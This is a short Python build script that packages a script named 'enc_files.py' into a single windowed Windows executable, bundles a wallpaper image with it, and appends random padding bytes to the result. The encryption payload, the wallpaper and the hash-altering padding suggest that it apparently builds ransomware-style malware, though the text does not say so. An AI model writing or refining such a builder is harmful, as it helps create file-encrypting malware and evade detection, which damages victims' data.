import os
import subprocess
import config

def package_script(script_name):
    # Check if PyInstaller is installed
    try:
        import PyInstaller
    except ImportError:
        print("PyInstaller is not installed. Installing it now...")
        subprocess.check_call(['pip', 'install', 'pyinstaller'])

    # Create the command to package the encryption script
    command = f'pyinstaller --onefile --windowed --add-data "images/wallpaper.png;images" {script_name}'

    # Run the command for the encryption script
    process = subprocess.Popen(command, shell=True)
    process.communicate()

    # Check if the executable was created successfully
    dist_dir = 'dist'
    if os.path.exists(dist_dir):
        executable_name = config.ENC_EXE
        os.rename(os.path.join(dist_dir, script_name.replace('.py', '.exe')), executable_name)
        print(f"Executable created: {executable_name}")
        
        # Add dummy data to the final executable
        with open(executable_name, 'ab') as exe_file:
            dummy_data = os.urandom(config.PADDING_SIZE)  # Use padding size from config
            exe_file.write(dummy_data)
            print("Dummy data added to the executable")
    else:
        print("Error: dist directory not found")

if __name__ == "__main__":
    script_to_package = 'enc_files.py'
    package_script(script_to_package)
    input("Press Enter to exit...")  # Keep the console window open
